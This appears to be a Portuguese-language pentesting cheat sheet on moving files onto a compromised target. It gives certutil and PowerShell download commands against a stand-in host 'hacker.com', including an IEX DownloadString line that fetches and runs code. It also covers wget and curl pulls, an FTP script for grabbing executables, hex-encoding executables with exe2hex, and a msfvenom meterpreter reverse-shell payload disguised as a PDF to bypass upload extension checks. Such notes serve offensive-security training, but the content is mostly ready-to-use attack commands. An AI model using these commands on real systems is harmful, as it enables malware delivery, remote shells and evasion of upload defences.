# Transferência de arquivos

## Servidor Web

### Servidor
```
python3 -m http.server 80
```

### Alvo - Windows  
```
certutil.exe -urlcache -f http://hacker.com/arquivo.exe arquivo.exe  
powershell.exe wget http://hacker.com/arquivo.exe arquivo.exe -OutFile arquivo.exe  
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://hacker.com/arquivo.exe','arquivo.exe') 
powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://hacker.com/arquivo.txt') 
``` 

### Alvo - Linux
```  
wget http://hacker.com/arquivo.exe -O /tmp/arquivo.exe 
curl http://hacker.com/arquivo.exe -o /tmp/arquivo.exe 
```

## FTP

### Servidor
```
pip install pyftpdlib
python3 -m pyftpdlib -p 21 --write
```
### Windows
```
# Gravar instruções em arquivo .txt
echo open host > steps.txt
echo USER anonymous >> steps.txt
echo PASS anonymous >> steps.txt
echo bin >> steps.txt
echo GET *.exe >> steps.txt
echo QUIT

# Executar as instruções no alvo
ftp -v -n -s:steps.txt
```

## Hexadecimal

### Windows
É possível encodar um executável em string e decodar no alvo.  
O primeiro passo é reduzir o tamanho do executável.

`upx -9 arquivo.exe`

Para encodar o executável vamos usar o `exe2hex` com a opção `-p` indicando que será decodado pelo Powershell. Outra opção seria utilizar a flag `-b` indicando que seria decodado pelo Batch.  

```
exe2hex -x arquivo.exe -p arquivo.txt
```

A saída é um arquivo txt com todo o executável em hexadecimal, copie o conteúdo do arquivo e cole no terminal do alvo.  
No final da execução o executável será recriado na máquina alvo.

## Via upload web com validação de extensão  

Primeira ação é gerar um payload da shell reversa usando `msfvenom`.

```
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -f elf > shell
```

Módulo para ouvir a porta no Metasploit:
```
exploit/multi/handler
# Payload
linux/x86/meterpreter/reverse_tcp
```
No exemplo vamos realizar o bypass na validação de extensões .pdf, primeiro criamos um arquivo chamado `header` e no seu conteúdo incluímos `%PDF-1.3`. Depois é só juntar os dois arquivos com o comando `cat header shell > payload.pdf`.

Após realizar o upload do arquivo malicioso, precisamos remover a extensão .pdf para que possamos executa-lo.

```
tail -n +2 payload.pdf > payload
```
